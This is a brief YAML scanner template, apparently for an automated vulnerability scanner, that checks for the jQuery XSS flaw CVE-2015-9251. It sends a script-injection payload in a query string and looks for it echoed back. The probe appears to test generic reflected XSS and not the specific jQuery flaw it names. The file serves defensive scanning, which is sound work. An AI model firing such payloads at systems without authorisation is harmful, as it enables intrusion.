author: ni
description: jQuery before 3.0.0 is vulnerable to Cross-site Scripting (XSS) attacks
  when a cross-domain Ajax request is performed without the dataType option, causing
  text/javascript responses to be executed.
name: CVE-2015-9251
requests:
- headers:
    Content-Type: application/x-www-form-urlencoded
  method: GET
  response:
    body:
      contains:
      - alert(1)
  url: '{{BaseURL}}/ajax/?q=1''><script>alert(1)</script>'
severity: high
tags:
- cve
- cve2015-9251
- xss
- jquery
